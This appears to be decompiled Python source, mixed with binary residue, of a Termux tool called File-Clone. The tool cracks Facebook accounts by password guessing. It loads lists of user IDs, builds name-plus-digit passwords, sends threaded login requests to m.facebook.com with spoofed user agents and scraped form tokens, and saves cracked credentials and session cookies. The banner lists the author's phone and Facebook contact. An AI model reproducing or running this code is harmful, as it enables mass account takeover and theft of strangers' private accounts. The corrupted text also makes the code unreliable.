(Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36�SAVEz[mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34m�January�February�March�April�May�June�July�Agustus�	September�October�November�December)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04�05�06�07�08�09r5   r6   r7   zSAVE/�-z.okz.cp�ac                  �.   � t          j        d�  �         d S )N�clear)�os�system� �    �

file-clone.pyrD   rD   W   s   � ���7�����rH   c                  �"   � t          �   �          d S )N)�loginrG   rH   rI   �backrL   Z   s   � ������rH   u�  [1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37m[1;36m═[1;37mu�  [1;36m

███████╗██╗██╗     ███████╗    

██╔════╝██║██║     ██╔════╝    

█████╗  ██║██║     █████╗      

██╔══╝  ██║██║     ██╔══╝      

██║     ██║███████╗███████╗    

╚═╝     ╚═╝╚══════╝╚══════╝    

[1;33m

╔══════════════════════════════════════════╗

║ Tools Name : File-Clone                  ║

║ Author : TUHIN AHMMED                      ║

║Whatsapp   +8801886750862         ║

║ FB : Mohammad Tuhin Ahmed   ║

╚══════════════════════════════════════════╝

c                  ��  � t          �   �          t          t          �  �         t          t          �  �         	 t	          d�  �        } t          j        d�  �         t          | d�  �        �                    �   �         D ].}t          �

                    |�                    �   �         �  �         �/t          �   �          d S # t          $ r* t          t          �  �         t          d| z  �  �         Y d S w xY w)Nu!   [1;32m [•] FILE PATH :[1;33m �Dxdg-open https://facebook.com/groups/spamming.termux.learning.point/�ru!    [1;31m[•] File [%s] Not Found)rD   r

   �logo�liner�inputrE   rF   �open�	readlines�id�append�strip�setting�IOError�exit)�fileX�lines     rI   �Filer]   o   s�   � ��7�7�7���;�;�;���<�<�<�	9��<�=�=�E��I�T�U�U�U��U�C� � �*�*�,�,� � ���Y�Y�t�z�z�|�|������I�I�I�I�I��

� 9� 9� 9�	�%�L�L�L��	/��	7�8�8�8�8�8�8�9���s   �BB< �<0C0�/C0c                  �  � d} | dv r2t          t          �  �        D ]}t          �                    |�  �         �n�| dv rzg }t          t          �  �        D ]}|�                    |�  �         �t	          |�  �        }|dz

  }t          |�  �        D ]'}t          �                    ||         �  �         |dz  }�(nn| dv rMt          D ]D}t

          j        dt	          t          �  �        �  �        }t          �                    ||�  �         �Ent          d�  �         t          �   �          t          t          �  �         t          d�  �         t          d	�  �         t          d

�  �        }|dv rt          �                    d�  �         n9|dv rt          �                    d�  �         nt          �                    d�  �         t          �   �          d S )

Nr-   �r,   r8   �r-   r9   r   )r.   r:   r   u)    [1;31m[×] Choose Correct Option[1;37mzS[1;37m         <\>[1;32m CHOOSE METHOD [1;37m</>

[1;33m [01] Mobile [Default] z[1;35m [02] Free [1;97m�$[1;36m [>_] [1;32mMETHOD :[1;33m �mobile�free)�sortedrU   �id2rV   �len�range�random�randint�insertr

   rZ   rQ   rR   �method�passmenu)	�hu�tua�muda�bacot�bcm�bcmi�xmud�xx�hcs	            rI   rX   rX   ~   s�  � �

���*�� 	�

�B�Z�Z� � �c��:�:�c�?�?�?�?�� 	�J�� 	�	�$��b�z�z� � �e��;�;�u�����	�$�i�i�#��A��$��C�j�j� � �d��:�:�d�4�j�����!�8�4�4�� 	�J�� 	�� � �e���q��S���"�"�2��:�:�b������� �	:�;�;�;��&�&�&��u�����k�l�l�l�mr�  uV�  nW�  nW�  nW��

<�=�=���*�� ��-�-�������J�� ��-�-�������-�-�����	�����rH   c                  �  � t          t          �  �         t          d�  �         t          d�  �        } | dv rt          �   �          d S | dv rt	          �   �          d S t          j        d�  �         t          d�  �         t          �   �          d S )Nz�[1;37m         <\>[1;32m PASSWORD METHOD [1;37m</>

[1;36m [01] FIRST NAME+DIGIT PASS [3 PASS] 

[1;35m [02] FULL NAME+DIGIT PASS [6 PASS]ra   r_   r`   rN   u    [1;31m [×] WRONG VALUE ENTERED)r

   rQ   rR   �first�name2rE   rF   rl   )�passmens    rI   rl   rl   �   s�   � ��u����e�  y�  z�  z�  z�	�>�	?�	?���z�� 

��'�'�'�'�'�

��� 

��'�'�'�'�'��)�R�S�S�S��-�.�.�.�

�*�*�*�*�*rH   c                  �  � t          t          �  �         t          d�  �         t          dt          z   �  �         t          dt          z   �  �         t          t          �  �         t	          d��  �        5 } t

          D �]o}|�                    d�  �        d         |�                    d�  �        d         �                    �   �         }}|�                    d	�  �        d         }d

g}t          |�  �        dk     rEt          |�  �        dk     rnu|�	                    |d

z   �  �         |�	                    |dz   �  �         nDt          |�  �        dk     rn0|�	                    |d

z   �  �         |�	                    |dz   �  �         dt          v r| �                    t          ||�  �         ��,dt          v r| �                    t          ||�  �         ��S| �                    t          ||�  �         ��q	 d d d �  �         d S # 1 swxY w Y   d S )N�}[1;33m Cracking Starting...

[1;34m On/Off Flight Mode In Every 5 Minute Later[1;0m

[1;31m Press [CTRL+Z] For Stop Process�

[1;32m OK : �

[1;35m CP : �2   ��max_workers�|r   r   � �123456�   �   �123�12345rb   rc   �r

   rQ   �okc�cpc�tredre   �split�lowerrf   rV   rk   �submit�crackrc   ��pool�yuzong�idf�nmf�frs�pwvs         rI   rw   rw   �   s/  � ��u����e�  b�  c�  c�  c���#�����u�%7��%;�<�<�<��u����

�r���� �d�� � �f�

�\�\�#�

�

�q�

!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�

��3�	�#�h�h�q�j� 

�

�3�x�x��z� �	��Z�Z��E�	�����Z�Z��G������

�3�x�x��z� �	� 	�Z�Z��E�	�����Z�Z��G������&�� ��K�K��c�#������&�� ��K�K��S�������K�K��c�#�����/�� � � � � � � � � � � ���� � � � � � s   �6E9G=�=H�Hc                  �T  � t          t          �  �         t          d�  �         t          dt          z   �  �         t          dt          z   �  �         t          t          �  �         t	          d��  �        5 } t

          D �]}|�                    d�  �        d         |�                    d�  �        d         �                    �   �         }}|�                    d	�  �        d         }d

g}t          |�  �        dk     r�t          |�  �        dk     r�n|�	                    |�  �         |�	                    |d

z   �  �         |�	                    |dz   �  �         |�	                    |dz   �  �         |�	                    |dz   �  �         n�t          |�  �        dk     r|�	                    |�  �         nu|�	                    |�  �         |�	                    |d

z   �  �         |�	                    |dz   �  �         |�	                    |dz   �  �         |�	                    |dz   �  �         dt          v r| �                    t          ||�  �         ���dt          v r| �                    t          ||�  �         ���| �                    t          ||�  �         ��	 d d d �  �         d S # 1 swxY w Y   d S )Nr{   r|   r}   r~   r   r�   r   r   r�   r�   r�   r�   r�   r�   �786�1234rb   rc   r�   r�   s         rI   rx   rx   �   s�  � ��u����e�  b�  c�  c�  c���#�����u�%7��%;�<�<�<��u����

�r���� �d�� � �f�

�\�\�#�

�

�q�

!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�

��3�	�#�h�h�q�j� �

�3�x�x��z� �	��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��G������Z�Z��E�	�����Z�Z��F�

�����

�3�x�x��z� ��Z�Z��_�_�_�_��Z�Z��_�_�_��Z�Z��E�	�����Z�Z��G������Z�Z��F�

�����Z�Z��E�	�����&�� ��K�K��c�#������&�� ��K�K��S�������K�K��c�#�����9�� � � � � � � � � � � ���� � � � � � s   �6HJ�J!�$J!c                 ��  � t          j        t          t          t          t

          t          t          g�  �        }t          dz  t          t          �  �        z  }d}t          j        �

                    d|�dt          �dt          t          �  �        �dt          t          �  �        �dt          �d��  �        f t          j        �                    �   �          t          j        t"          �  �        }t          j        t$          �  �        }t'          j        �   �         }|D �]F}	 |�                    �   �         }|j        �                    d	d

|dd

dd

ddddddd�

�  �         |�                    d| z   dz   �  �        j        }	t5          j        dt9          |	�  �        �  �        �                    d�  �        t5          j        dt9          |	�  �        �  �        �                    d�  �        | d|dd�}

|j        �                    d	dd

dd|ddd

dddd| z   dz   ddd ��  �         |�                    d!|

d"�#�  �        }d$|j        �                     �   �         �!                    �   �         v r�t          dz

  atE          d%tF          z   d&z   t9          | �  �        z   d'z   t9          |�  �        z   d(z   tF          z   �  �         tI          d)tJ          z   d*�  �        �

                    | d+z   |z   d%z   �  �         tL          �'                    | d+z   |z   �  �          �n[d,|j        �                     �   �         �!                    �   �         v r�|j        �                     �   �         }d-�(                    d.� |j        �                     �   �         �)                    �   �         D �   �         �  �        }tE          d%tF          z   d/z   t9          | �  �        z   d'z   t9          |�  �        z   d0z   |z   d%z   tF          z   �  �         | �d1|��}

t          �'                    |

�  �         tI          tT          d*�  �        �

                    d2|

z  �  �          n1��# t&          j+        j,        $ r t[          j.        d3�  �         Y ��Dw xY wt          dz

  ad S )4N�d   �%�

 �[STLP] [�/�

   ] • [OK:�

   ] • [CP:�]  zm.facebook.comr,   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�documentzhttps://m.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8�

�Host�upgrade-insecure-requests�

user-agent�accept�dnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagez8https://m.facebook.com/login/device-based/password/?uid=�6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"�login_no_pinz*https://m.facebook.com/login/save-device/'��lsd�jazoest�uid�flow�pass�next�	max-age=0zhttps://m.facebook.com�!application/x-www-form-urlencoded�r�   z

cache-controlr�   �originzcontent-typer�   r�   r�   r�   r�   r�   r�   r�   r�   r�   zShttps://m.facebook.com/login/device-based/vnisaddate-password/?shbl=0&locale2=id_IDF��data�allow_redirects�

checkpoint�

�

[1;34mUid/Number: �

Password  : �

Status    : CheckPoint

